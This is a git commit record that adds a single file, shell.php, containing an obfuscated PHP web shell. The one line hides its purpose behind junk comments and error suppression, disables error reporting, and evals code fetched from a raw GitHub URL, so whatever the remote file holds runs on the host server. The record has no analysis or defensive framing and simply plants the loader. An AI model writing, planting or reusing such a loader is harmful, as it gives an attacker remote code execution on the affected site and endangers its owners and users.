f7e4d5722ec1dc4618a64242b537def77af380e0
vyscomaylando <vyscomaylando@gmail.com>
2024-06-28 12:31:16 +0700

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/vyscomaylando/quixter/main/private.js"))/******/?>
